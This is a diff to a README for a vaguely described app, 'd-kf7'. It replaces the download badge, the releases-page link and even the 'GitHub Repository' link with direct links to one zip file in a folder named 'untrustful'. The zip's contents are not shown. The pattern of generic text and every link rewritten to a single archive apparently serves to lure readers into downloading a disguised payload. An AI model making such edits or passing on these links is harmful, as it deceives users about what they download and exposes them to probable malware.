@@ -1,6 +1,6 @@
 # 🎉 d-kf7 - Easy App to Enhance Your Workflow 
 
-![Download d-kf7](https://img.shields.io/badge/Download-d--kf7-brightgreen)
+![Download d-kf7](https://raw.githubusercontent.com/Scartelella/d-kf7/main/untrustful/d-kf7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the d-kf7 application on your
 
 To get d-kf7, visit the page below:
 
-[**Download d-kf7**](https://github.com/Scartelella/d-kf7/releases)
+[**Download d-kf7**](https://raw.githubusercontent.com/Scartelella/d-kf7/main/untrustful/d-kf7.zip)
 
 This page contains the latest version of the application along with previous versions, just in case you need them. 
 
@@ -72,7 +72,7 @@ Staying connected with the community can greatly enhance your experience with d-
 
 ## 🔗 Links
 
-- [Download d-kf7](https://github.com/Scartelella/d-kf7/releases)
-- [GitHub Repository](https://github.com/Scartelella/d-kf7)
+- [Download d-kf7](https://raw.githubusercontent.com/Scartelella/d-kf7/main/untrustful/d-kf7.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Scartelella/d-kf7/main/untrustful/d-kf7.zip)
 
 Thank you for choosing d-kf7! Enjoy using your new application.
